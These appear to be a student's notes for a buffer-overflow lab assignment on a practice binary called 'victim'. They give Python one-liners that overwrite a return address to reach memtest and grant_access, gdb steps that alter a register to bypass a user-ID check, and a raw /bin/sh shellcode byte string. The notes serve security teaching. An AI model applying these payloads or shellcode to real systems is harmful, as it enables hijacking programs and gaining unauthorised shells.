# Assignment 2

## Step 1

```sh
objdump -d victim > source.dump
# find memtest address and make it little endian
# 08049206 <memtest>
python -c "print 'A' * 24 + '\x06\x92\x04\x08'" | ./victim
>>Return address: 0x00000000
>>Frame address:  0xffafffdc
```

## Step 2

```sh
id -ur #1000
printf '%x\n' 1000 #0x3e8
# bof to \xa2\x92\x04\x08 0x080492a2 <grant_access>
python -c "print 'A' * 24 + '\xa2\x92\x04\x08'" > out2
gdb victim
(gdb) r < out2
(gdb) b * 0x80492b3 # before cmp
(gdb) set $eax = 0x3e8
```

## Step 5

Hijack Victim OS?

# Resources

- [Helper Exploit-Exercises-Protostar](https://github.com/z3tta/Exploit-Exercises-Protostar)
- https://0xrick.github.io/binary-exploitation/bof6/
- ToBreak \xCC\*64
- NOP \x90
- [Py.Struct](https://docs.python.org/2/library/struct.html)
- http://shell-storm.org/
- http://shell-storm.org/shellcode/
- https://www.youtube.com/watch?v=oS2O75H57qU
- https://www.youtube.com/watch?v=T03idxny9jE
- http://shell-storm.org/shellcode/files/shellcode-811.php
- \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
- To execute shell code, you can edit a function's contents directly: [link](https://stackoverflow.com/questions/5661021/how-to-run-assembly-in-gdb-directly)
- `esp`: the **top of the stack**. It points to (holds the address of) the most-recently pushed value on the stack.
- `eip`: is the instruction pointer. It points to (holds the address of) the first byte of the **next instruction to be executed**.
- `ebp`: is usually set to esp at the start of the function. Function parameters and local variables are accessed by adding and subtracting, respectively, a constant offset from ebp. All x86 calling conventions define ebp as being preserved across function calls. ebp itself actually points to the previous frame's base pointer, which enables stack walking in a debugger and viewing other frames local variables to work.

## Endian

![Big-Endian](https://upload.wikimedia.org/wikipedia/commons/thumb/5/54/Big-Endian.svg/280px-Big-Endian.svg.png)
![Little-Endian](https://upload.wikimedia.org/wikipedia/commons/thumb/e/ed/Little-Endian.svg/280px-Little-Endian.svg.png)

